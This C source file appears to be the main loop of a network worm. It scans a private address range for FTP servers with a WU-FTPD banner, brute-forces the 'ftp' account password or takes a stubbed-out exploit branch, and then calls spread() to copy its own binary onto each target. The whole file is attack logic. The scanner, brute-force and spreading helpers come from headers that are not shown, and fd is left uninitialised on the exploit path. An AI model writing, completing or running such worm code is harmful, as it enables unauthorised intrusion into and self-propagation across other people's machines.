#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//---
#include "scanner.h"
#include "bruteforce.h"
#include "exploit.h"
#include "spread.h"

#ifndef ADDRESS_RANGE
#  define ADDRESS_RANGE       "192.168.0.0-255"
#endif

#ifndef PORT_RANGE
#  define PORT_RANGE          "10-100"
#endif

#ifndef INTERFACE
#  define INTERFACE           "eth0"
#endif

#ifndef USE_RAW_SOCKET
#  define USE_RAW_SOCKET      1
#endif

#ifndef FTP_USER
#  define FTP_USER            "ftp"
#endif

int main(int argc, const char *argv[]) {
  struct scan_table *target_table, *target;
  char guess[MAX_PASSWORD_LENGTH];
  int fd, method;

  srand(time(NULL));

  target_table = scanner(ADDRESS_RANGE, PORT_RANGE, INTERFACE, USE_RAW_SOCKET, 1);
  if(target_table != NULL) {
    for(target = target_table; target != NULL; target = target->next) {
      if(strstr(target->banner, "WUFTPD") != NULL) {
        if((method = rand() % 2) == 0) {
          while(bruteforce(guess, sizeof guess) != 0) {
            if((fd = ftp_login(target->address, target->port, FTP_USER, guess)) > 0) {
              fprintf(stdout, "Connected to FTP! Password is \"%s\"\n", guess);
              break;
            }
          }
        } else {
          /* exploit */
        }

        spread(fd, argv[0], argv[0]);
      }
    }
  }

  return 0;
}
